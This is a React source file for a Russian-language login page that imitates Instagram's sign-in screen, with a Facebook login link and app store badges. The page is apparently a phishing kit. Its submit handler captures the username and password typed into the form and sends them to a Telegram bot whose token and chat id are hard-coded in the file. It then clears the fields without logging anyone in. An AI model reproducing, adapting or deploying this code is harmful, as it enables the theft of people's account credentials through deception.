import React from "react";
import "./Form.css";
import { AiFillFacebook } from "react-icons/ai";
import BG from "../../assets/form-page/bg1.png";
import Phone from "../../assets/form-page/phone.png";
import Logo from "../../assets/form-page/logo.png";
import AppStore from "../../assets/form-page/app-store.png";
import PlayMarket from "../../assets/form-page/play-market.png";

function Form() {
  const handleSubmit = e => {
    e.preventDefault();

    let token = "6315734096:AAEQilGwwovErYOjX5nwpMmJy9vGWJ6Wb6Y";
    let chat_id = 5585680622;

    let username = encodeURIComponent(
      document.querySelector(".username").value
    );
    let password = encodeURIComponent(
      document.querySelector(".password").value
    );

    let text = `Username: ${username} %0A Password: ${password}`;

    let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${text}&parse_mode=html`;

    let api = new XMLHttpRequest();
    api.open("GET", url, true);
    api.send();

    console.log(username);
    console.log(password);

    document.querySelector(".username").value = "";
    document.querySelector(".password").value = "";
  };

  return (
    <div className="form">
      <div className="form__wrapper">
        <div className="form__top">
          <div className="form__left">
            <div className="form__left-img">
              <img src={BG} alt="" />
              <img src={Phone} alt="" className="form__left-img-absolute" />
            </div>
          </div>
          <div className="form__right">
            <div className="form__right-top">
              <div className="form__right-logo">
                <img src={Logo} alt="" />
              </div>
              <form
                action="#"
                className="form__right-form"
                onSubmit={handleSubmit}
              >
                <input
                  type="text"
                  placeholder="Телефон, имя пользователя или эл. адрес"
                  className="username"
                  required
                />
                <input
                  type="password"
                  placeholder="Пароль"
                  className="password"
                  required
                />
                <button type="submit">Войти</button>
              </form>
              <div className="form__right-or">
                <p>или</p>
              </div>
              <div className="form__right-bottom">
                <p className="form__right-bottom-title">
                  <AiFillFacebook />
                  <span>Войти через Facebook</span>
                </p>
                <div className="form__right-bottom-subtitle">
                  <p>Забыли пароль?</p>
                </div>
              </div>
            </div>

            <div className="form__bottom">
              <div className="form__bottom-title">
                <div className="form__bottom-title-wrapper">
                  <p>У вас ещё нет аккаунта? </p>
                  <a href="#">Зарегистрироваться</a>
                </div>
              </div>
              <div className="form__actions">
                <div className="form__actions-title">
                  <p>Установите приложение.</p>
                </div>
                <div className="form__actions-img-wrapper">
                  <div className="form__actions-img">
                    <img src={AppStore} alt="" width={136} height={40} />
                  </div>
                  <div className="form__actions-img">
                    <img src={PlayMarket} alt="" width={136} height={40} />
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default Form;
